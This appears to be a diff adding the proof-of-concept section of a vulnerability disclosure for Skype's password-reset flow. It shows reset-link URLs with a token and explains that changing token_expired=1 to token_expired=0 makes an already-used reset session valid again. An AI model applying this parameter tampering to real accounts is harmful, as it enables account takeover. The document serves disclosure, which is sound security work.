@@ -1,0 +1,21 @@
+Proof of Concept:
+=================
+The vulnerability can be exploited by remote attackers without required
+user inter action and without privileged user account.
+For demonstration or reproduce ...
+
+Reset Account: (Mail Link)
+https://api.skype.com/tracking/emails/click?m=7131000014602077951&go=account.changepassword&x=intcmp%3DT_140-_-H-_-311012-_-
+account.changepassword%26token%3D621d8b0e773cc298a149a1b916118114%26application%3Daccount
+
+which leads to the expired request with the already used session 6h+ ago ...
+
+https://login.skype.com/intl/de/account/password-reset-request?token=621d8b0e773cc298a149a1b916118114&mode=&token_expired=1
+
+It is only required to insert 0 (zero) in the GET/POST request make the
+session valid again. Replace token_expired=1 => token_expired=0
+
+https://login.skype.com/intl/de/account/password-reset-request?token=621d8b0e773cc298a149a1b916118114&mode=&token_expired=0
+
+
+Video (PoC): http://www.youtube.com/watch?v=lrNj785QQlg
